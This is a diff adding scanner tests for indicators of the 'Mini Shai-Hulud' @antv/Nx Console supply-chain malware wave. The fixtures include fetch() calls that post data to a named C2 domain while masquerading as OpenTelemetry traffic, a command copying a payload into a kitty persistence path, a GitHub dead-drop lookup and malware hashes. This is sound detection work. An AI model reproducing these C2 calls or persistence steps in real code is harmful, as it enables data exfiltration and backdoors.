@@ -1226,4 +1226,94 @@ describe("Campaign Signatures", () => {
       expect(finding?.severity).toBe("critical");
     });
   });
+
+  // =================================================================
+  // Mini Shai-Hulud @antv / Nx Console / actions-cool wave (May 2026)
+  // =================================================================
+
+  describe("Mini Shai-Hulud @antv / Nx Console / actions-cool wave (May 2026)", () => {
+    it("should detect t.m-kosche.com shared C2 domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "c2.js"),
+        'fetch("https://t.m-kosche.com/api/public/otel/v1/traces", { method: "POST" });'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect @antv index.js Bun payload SHA256", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "hashlist.js"),
+        'const h = "a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect Nx Console malicious VSIX SHA256", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "hash.js"),
+        'const sha = "1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect kitty/cat.py persistence backdoor reference", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "persist.sh"),
+        'cp payload.py ~/.local/share/kitty/cat.py'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "ANTV_WAVE_KITTY_PERSISTENCE"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect firedalazer GitHub Search dead-drop marker", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "dropper.js"),
+        'fetch("https://api.github.com/search/commits?q=firedalazer");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "ANTV_WAVE_FIREDALAZER"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect OpenTelemetry masquerade C2 pattern", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "exfil.js"),
+        'await fetch("https://t.m-kosche.com:443/api/public/otel/v1/traces", { body });'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "ANTV_WAVE_OTEL_C2"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
